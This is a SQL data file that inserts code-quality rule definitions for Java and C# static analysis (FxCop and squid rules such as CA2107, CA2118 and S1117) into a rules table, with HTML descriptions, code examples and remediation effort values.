INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (791, 'Local variables should not shadow class fields', 'HiddenFieldCheck', 'S1117', 'squid', '<p>Shadowing fields with a local variable is a bad practice that reduces code readability: it makes it confusing to know whether the field or the
variable is being used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public int myField;

  public void doSomething() {
    int myField = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/2ADEAw">CERT, DCL51-J.</a> - Do not shadow or obscure identifiers in subscopes </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,pitfall', false, 'HTML', 1510817812805, 1510817812805, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (792, 'All branches in a conditional structure should not have exactly the same implementation', 'S3923', NULL, 'squid', '<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn''t be a <code>switch</code>/<code>if</code> chain at all. Note that this rule does not
apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code> clauses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
}
else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812806, 1510817812807, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (485, 'CA1005: Avoid excessive parameters on generic types', 'AvoidExcessiveParametersOnGenericTypes', 'CA1005', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible generic type has more than two type parameters.
</p>
<h2>Rule Description</h2>
<p>
            The more type parameters a generic type contains, the more difficult it is to know and remember what each type parameter represents. It is usually obvious with one type parameter, as in List&lt;T&gt;, and in certain cases with two type parameters, as in Dictionary&lt;TKey, TValue&gt;. If more than two type parameters exist, the difficulty becomes too great for most users (for example, TooManyTypeParameters&lt;T, K, V&gt; in C# or TooManyTypeParameters(Of T, K, V) in Visual Basic).
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the design to use no more than two type parameters.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule unless the design absolutely requires more than two type parameters. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182129.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182129.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812381, 1510817812381, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (486, 'CA2107: Review deny and permit only usage', 'ReviewDenyAndPermitOnlyUsage', 'CA2107', 'fxcop', '<h2>Cause</h2>
<p>
            A method contains a security check that specifies the PermitOnly or Deny security action.
</p>
<h2>Rule Description</h2>
<p>
            The Using the PermitOnly Method and <code>CodeAccessPermission.Deny</code> security actions should be used only by those who have an advanced knowledge of .NET Framework security. Code that uses these security actions should undergo a security review.
            Deny alters the default behavior of the stack walk that occurs in response to a security demand. It lets you specify permissions that must not be granted for the duration of the denying method, regardless of the actual permissions of the callers in the call stack. If the stack walk detects a method that is secured by Deny, and if the demanded permission is included in the denied permissions, the stack walk fails. PermitOnly also alters the default behavior of the stack walk. It allows code to specify only those permissions that can be granted, regardless of the permissions of the callers. If the stack walk detects a method that is secured by PermitOnly, and if the demanded permission is not included in the permissions that are specified by the PermitOnly, the stack walk fails.
            Code that relies on these actions should be carefully evaluated for security vulnerabilities because of their limited usefulness and subtle behavior. Consider the following:
            <ul>
              <li>


                    Link Demands
                   are not affected by Deny or PermitOnly.
              </li>
              <li>
                If the Deny or PermitOnly occurs in the same stack frame as the demand that causes the stack walk, the security actions have no effect.
              </li>
              <li>
                Values that are used to construct path-based permissions can usually be specified in multiple ways. Denying access to one form of the path does not deny access to all forms. For example, if a file share \\Server\Share is mapped to a network drive X:, to deny access to a file on the share, you must deny \\Server\Share\File, X:\File and every other path that accesses the file.
              </li>
              <li>
                An <code>CodeAccessPermission.Assert</code> can terminate a stack walk before the Deny or PermitOnly is reached.
              </li>
              <li>
                If a Deny has any effect, namely, when a caller has a permission that is blocked by the Deny, the caller can access the protected resource directly, bypassing the Deny. Similarly, if the caller does not have the denied permission, the stack walk would fail without the Deny.
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            Any use of these security actions will cause a violation. To fix a violation, do not use these security actions.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only after you complete a security review.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182308.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182308.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812382, 1510817812383, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (488, 'CA1412: Mark ComSource Interfaces as IDispatch', 'MarkComSourceInterfacesAsIDispatch', 'CA1412', 'fxcop', '<h2>Cause</h2>
<p>
            A type is marked with the <code>ComSourceInterfacesAttribute</code> attribute and at least one specified interface is not marked with the <code>InterfaceTypeAttribute</code> attribute set to the <code>InterfaceIsDispatch</code> value.
</p>
<h2>Rule Description</h2>
<p>


                <code>ComSourceInterfacesAttribute</code>
               is used to identify the event interfaces that a class exposes to Component Object Model (COM) clients. These interfaces must be exposed as <code>InterfaceIsIDispatch</code> to enable Visual Basic 6 COM clients to receive event notifications. By default, if an interface is not marked with the <code>InterfaceTypeAttribute</code> attribute, it is exposed as a dual interface.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add or modify the <code>InterfaceTypeAttribute</code> attribute so that its value is set to InterfaceIsIDispatch for all interfaces that are specified with the <code>ComSourceInterfacesAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotUseAutoDualClassInterfaceType}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182207.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182207.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812385, 1510817812385, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (489, 'CA2151: Fields with critical types should be security critical', 'CA2151', 'CA2151', 'fxcop', '<h2>Cause</h2>
<p>
            A security transparent field or a safe critical field is declared. Its type is specified as security critical. For example:









            <pre>
[assembly: AllowPartiallyTrustedCallers]

   [SecurityCritical]
   class Type1 { } // Security Critical type

   class Type2 // Security transparent type
   {
      Type1 m_field; // CA2151, transparent field of critical type
   }
</pre>




In this example, m_field is a security transparent field of a type that is security critical.






                Rule Description





</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the field with the <code>SecurityCriticalAttribute</code> attribute, or make the type that is referenced by the field eith security transparent or safe critical.









            <pre>
// Fix 1: Make the referencing field security critical
[assembly: AllowPartiallyTrustedCallers]

   [SecurityCritical]
   class Type1 { } // Security Critical type

   class Type2 // Security transparent type
   {
      [SecurityCritical]
      Type1 m_field; // Fixed: critical type, critical field
   }

// Fix 2: Make the referencing field security critical
[assembly: AllowPartiallyTrustedCallers]


   class Type1 { } // Type1 is now transparent

   class Type2 // Security transparent type
   {
      [SecurityCritical]
      Type1 m_field; // Fixed: critical type, critical field
   }
</pre>











                When to Suppress Warnings





</p>
<h2>Code</h2>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.Security;

namespace TransparencyWarningsDemo
{

    public class SafeNativeMethods
    {
        // CA2145 violation - transparent method marked SuppressUnmanagedCodeSecurity.  This should be fixed by 
        // marking this method SecurityCritical.
        [DllImport("kernel32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool Beep(uint dwFreq, uint dwDuration);
    }
}
</pre>





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dn621098.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dn621098.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812386, 1510817812386, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (490, 'CA1704: Identifiers should be spelled correctly', 'IdentifiersShouldBeSpelledCorrectly', 'CA1704', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an identifier contains one or more words that are not recognized by the Microsoft spelling checker library. This rule does not check constructors or special-named members such as get and set property accessors.
</p>
<h2>Rule Description</h2>
<p>
            This rule parses the identifier into tokens and checks the spelling of each token. The parsing algorithm performs the following transformations:
            <ul>
              <li>
                Uppercase letters start a new token. For example, MyNameIsJoe tokenizes to "My", "Name", "Is", "Joe".
              </li>
              <li>
                For multiple uppercase letters, the last uppercase letter starts a new token. For example, GUIEditor tokenizes to "GUI", "Editor".
              </li>
              <li>
                Leading and trailing apostrophes are removed. For example, ''sender'' tokenizes to "sender".
              </li>
              <li>
                Underscores signify the end of a token and are removed. For example, Hello_world tokenizes to "Hello", "world".
              </li>
              <li>
                Embedded ampersands are removed. For example, for&amp;mat tokenizes to "format".
              </li>
            </ul>
            By default, the English (en) version of the spelling checker is used. No other language dictionaries are currently available.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, correct the spelling of the word or add the word to a custom dictionary that is named CustomDictionary.xml. Place the dictionary in the installation directory of the tool, the project directory, or in the directory that is associated with the tool under the profile of the user (%USERPROFILE%\Application Data\...). To learn how to add the custom dictionary to a project in Visual Studio, see How to: Customize the Code Analysis Dictionary
            <ul>
              <li>
                Add words that should not cause a violation under the Dictionary/Words/Recognized path.
              </li>
              <li>
                Add words that should cause a violation under the Dictionary/Words/Unrecognized path.
              </li>
              <li>
                Add words that should be flagged as obsolete under the Dictionary/Words/Deprecated path. See the related rule topic {rule:fxcop:UsePreferredTerms}for more information.
              </li>
              <li>
                Add exceptions to the acronym casing rules to the Dictionary/Acronyms/CasingExceptions path.
              </li>
            </ul>
            The following is an example of the structure of a custom dictionary file.









            <pre>
   &lt;Dictionary&gt;
      &lt;Words&gt;
         &lt;Unrecognized&gt;
            &lt;Word&gt;cb&lt;/Word&gt;
         &lt;/Unrecognized&gt;
         &lt;Recognized&gt;
            &lt;Word&gt;stylesheet&lt;/Word&gt;
            &lt;Word&gt;GotDotNet&lt;/Word&gt;
         &lt;/Recognized&gt;
         &lt;Deprecated&gt;
            &lt;Term PreferredAlternate="EnterpriseServices"&gt;ComPlus&lt;/Term&gt;
         &lt;/Deprecated&gt;
      &lt;/Words&gt;
      &lt;Acronyms&gt;
         &lt;CasingExceptions&gt;
            &lt;Acronym&gt;CJK&lt;/Acronym&gt;
            &lt;Acronym&gt;Pi&lt;/Acronym&gt;
         &lt;/CasingExceptions&gt;
      &lt;/Acronyms&gt;
   &lt;/Dictionary&gt;
</pre>











                When to Suppress Warnings





</p>
<h2>Related Rules</h2>
<p>


                CA2204: Literals should be spelled correctly




                CA1703: Resource strings should be spelled correctly




                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>




                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}<br/>




                {rule:fxcop:IdentifiersShouldNotContainUnderscores}<br/>




                {rule:fxcop:UsePreferredTerms}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264492.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264492.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812387, 1510817812387, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (491, 'CA2118: Review SuppressUnmanagedCodeSecurityAttribute usage', 'ReviewSuppressUnmanagedCodeSecurityUsage', 'CA2118', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type or member has the <code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>


                <code>SuppressUnmanagedCodeSecurityAttribute</code>
               changes the default security system behavior for members that execute unmanaged code using COM interop or platform invocation. Generally, the system makes a <code>Data and Modeling in the .NET Framework</code> for unmanaged code permission. This demand occurs at run time for every invocation of the member, and checks every caller in the call stack for permission. When the attribute is present, the system makes a Link Demands for the permission: the permissions of the immediate caller are checked when the caller is JIT-compiled.
            This attribute is primarily used to increase performance; however, the performance gains come with significant security risks. If you place the attribute on public members that call native methods, the callers in the call stack (other than the immediate caller) do not need unmanaged code permission to execute unmanaged code. Depending on the public member''s actions and input handling, it might allow untrustworthy callers to access functionality normally restricted to trustworthy code.
            The .NET Framework relies on security checks to prevent callers from gaining direct access to the current process''s address space. Because this attribute bypasses normal security, your code poses a serious threat if it can be used to read or write to the process''s memory. Note that the risk is not limited to methods that intentionally provide access to process memory; it is also present in any scenario where malicious code can achieve access by any means, for example, by providing surprising, malformed, or invalid input.
            The default security policy does not grant unmanaged code permission to an assembly unless it is executing from the local computer or is a member of one of the following groups:
            <ul>
              <li>
                My Computer Zone Code Group
              </li>
              <li>
                Microsoft Strong Name Code Group
              </li>
              <li>
                ECMA Strong Name Code Group
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            Carefully review your code to ensure that this attribute is absolutely necessary. If you are unfamiliar with managed code security, or do not understand the security implications of using this attribute, remove it from your code. If the attribute is required, you must ensure that callers cannot use your code maliciously. If your code does not have permission to execute unmanaged code, this attribute has no effect and should be removed.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            To safely suppress a warning from this rule, you must ensure that your code does not provide callers access to native operations or resources that can be used in a destructive manner.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182311.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182311.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812388, 1510817812389, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (492, 'CA1024: Use properties where appropriate', 'UsePropertiesWhereAppropriate', 'CA1024', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method has a name that starts with Get, takes no parameters, and returns a value that is not an array.
</p>
<h2>Rule Description</h2>
<p>
            In most cases, properties represent data and methods perform actions. Properties are accessed like fields, which makes them easier to use. A method is a good candidate to become a property if one of these conditions is present:
            <ul>
              <li>
                Takes no arguments and returns the state information of an object.
              </li>
              <li>
                Accepts a single argument to set some part of the state of an object.
              </li>
            </ul>
            Properties should behave as if they are fields; if the method cannot, it should not be changed to a property. Methods are better than properties in the following situations:
            <ul>
              <li>
                The method performs a time-consuming operation. The method is perceivably slower than the time that is required to set or get the value of a field.
              </li>
              <li>
                The method performs a conversion. Accessing a field does not return a converted version of the data that it stores.
              </li>
              <li>
                The Get method has an observable side effect. Retrieving the value of a field does not produce any side effects.
              </li>
              <li>
                The order of execution is important. Setting the value of a field does not rely on the occurrence of other operations.
              </li>
              <li>
                Calling the method two times in succession creates different results.
              </li>
              <li>
                The method is static but returns an object that can be changed by the caller. Retrieving the value of a field does not allow the caller to change the data that is stored by the field.
              </li>
              <li>
                The method returns an array.
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the method to a property.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if the method meets at least one of the previously listed criteria.
</p>
<h2>Controlling Property Expansion in the Debugger</h2>
<p>
            One reason programmers avoid using a property is because they do not want the debugger to auto-expand it. For example, the property might involve allocating a large object or calling a P/Invoke, but it might not actually have any observable side effects.
            You can prevent the debugger from auto-expanding properties by applying <code>System.Diagnostics.DebuggerBrowsableAttribute</code>. The following example shows this attribute being applied to an instance property.









            <pre>
using System;
using System.Diagnostics;

namespace Microsoft.Samples
{
    public class TestClass
    {
        // [...]

        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        public LargeObject LargeObject
        {
            get
            {
                // Allocate large object
                // [...]

        }
    }
}
</pre>











                Example





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182181.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182181.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812390, 1510817812390, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (493, 'CA2241: Provide correct arguments to formatting methods', 'ProvideCorrectArgumentsToFormattingMethods', 'CA2241', 'fxcop', '<h2>Cause</h2>
<p>
            The format string argument passed to a method such as <code>WriteLine</code>,  <code>Write</code>, or  <code>String.Format</code> does not contain a format item that corresponds to each object argument, or vice versa.
</p>
<h2>Rule Description</h2>
<p>
            The arguments to methods such as <code>WriteLine</code>, <code>Write</code>, and <code>Format</code> consist of a format string followed by several <code>System.Object</code> instances. The format string consists of text and embedded format items of the form, {index[,alignment][:formatString]}. ''index'' is a zero-based integer that indicates which of the objects to format. If an object does not have a corresponding index in the format string, the object is ignored. If the object specified by ''index'' does not exist, a <code>System.FormatException</code> is thrown at runtime.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, provide a format item for each object argument and provide an object argument for each format item.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182361.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182361.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '3min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812391, 1510817812392, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (494, 'CA1305: Specify IFormatProvider', 'SpecifyIFormatProvider', 'CA1305', 'fxcop', '<h2>Cause</h2>
<p>
            A method or constructor calls one or more members that have overloads that accept a <code>System.IFormatProvider</code> parameter, and the method or constructor does not call the overload that takes the <code>IFormatProvider</code> parameter. This rule ignores calls to .NET Framework methods that are documented as ignoring the <code>IFormatProvider</code> parameter and additionally the following methods:
            <ul>
              <li>


                    <code>Activator.CreateInstance</code>


              </li>
              <li>


                    <code>ResourceManager.GetObject</code>


              </li>
              <li>


                    <code>ResourceManager.GetString</code>


              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            When a <code>System.Globalization.CultureInfo</code> or <code>IFormatProvider</code> object is not supplied, the default value that is supplied by the overloaded member might not have the effect that you want in all locales. Also, .NET Framework members choose default culture and formatting based on assumptions that might not be correct for your code. To make sure that the code works as expected for your scenarios, you should supply culture-specific information according to the following guidelines:
            <ul>
              <li>
                If the value will be displayed to the user, use the current culture. See <code>CultureInfo.CurrentCulture</code>.
              </li>
              <li>
                If the value will be stored and accessed by software (persisted to a file or database), use the invariant culture. See <code>CultureInfo.InvariantCulture</code>.
              </li>
              <li>
                If you do not know the destination of the value, have the data consumer or provider specify the culture.
              </li>
            </ul>
            Note that <code>CultureInfo.CurrentUICulture</code> is used only to retrieve localized resources by using an instance of the <code>System.Resources.ResourceManager</code> class.
            Even if the default behavior of the overloaded member is appropriate for your needs, it is better to explicitly call the culture-specific overload so that your code is self-documenting and more easily maintained.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, use the overload that takes a <code>CultureInfo</code> or <code>IFormatProvider</code> and specify the argument according to the guidelines that were listed earlier.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when it is certain that the default culture/format provider is the correct choice and where code maintainability is not an important development priority.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:SpecifyCultureInfo}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182190.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182190.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812393, 1510817812393, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (495, 'CA2137: Transparent methods must contain only verifiable IL', 'TransparentMethodsMustBeVerifiable', 'CA2137', 'fxcop', '<h2>Cause</h2>
<p>
            A method contains unverifiable code or returns a type by reference.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires on attempts by security transparent code to execute unverifiable MSIL (Microsoft Intermediate Language). However, the rule does not contain a full IL verifier, and instead uses heuristics to catch most violations of MSIL verification.
            To be certain that your code contains only verifiable MSIL, run <code>Peverify.exe (PEVerify Tool)</code> on your assembly. Run PEVerify with the /transparent option which limits the output to only unverifiable transparent methods which would cause an error. If the /transparent option is not used, PEVerify also verifies critical methods that are allowed to contain unverifiable code.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the method with the <code>SecurityCriticalAttribute</code> or <code>SecuritySafeCriticalAttribute</code> attribute, or remove the unverifiable code.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd983954.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd983954.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812394, 1510817812394, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (496, 'CA1014: Mark assemblies with CLSCompliantAttribute', 'MarkAssembliesWithClsCompliant', 'CA1014', 'fxcop', '<h2>Cause</h2>
<p>
            An assembly does not have the <code>System.CLSCompliantAttribute</code> attribute applied to it.
</p>
<h2>Rule Description</h2>
<p>
            The Common Language Specification (CLS) defines naming restrictions, data types, and rules to which assemblies must conform if they will be used across programming languages. Good design dictates that all assemblies explicitly indicate CLS compliance with <code>CLSCompliantAttribute</code>. If the attribute is not present on an assembly, the assembly is not compliant.
            It is possible for a CLS-compliant assembly to contain types or type members that are not compliant.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add the attribute to the assembly. Instead of marking the whole assembly as noncompliant, you should determine which type or type members are not compliant and mark these elements as such. If possible, you should provide a CLS-compliant alternative for noncompliant members so that the widest possible audience can access all the functionality of your assembly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. If you do not want the assembly to be compliant, apply the attribute and set its value to <code>false</code>.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182156.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182156.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812395, 1510817812395, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (497, 'CA1307: Specify StringComparison', 'SpecifyStringComparison', 'CA1307', 'fxcop', '<h2>Cause</h2>
<p>
            A string comparison operation uses a method overload that does not set a <code>StringComparison</code> parameter.
</p>
<h2>Rule Description</h2>
<p>
            Many string operations, most important the <code>Compare</code> and <code>Equals</code> methods, provide an overload that accepts a <code>StringComparison</code> enumeration value as a parameter.
            Whenever an overload exists that takes a <code>StringComparison</code> parameter, it should be used instead of an overload that does not take this parameter. By explicitly setting this parameter, your code is often made clearer and easier to maintain.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change string comparison methods to overloads that accept the <code>StringComparison</code> enumeration as a parameter. For example: change String.Compare(str1, str2) to String.Compare(str1, str2, StringComparison.Ordinal).
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the library or application is intended for a limited local audience and will therefore not be localized.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb386080.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386080.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812396, 1510817812397, 1);
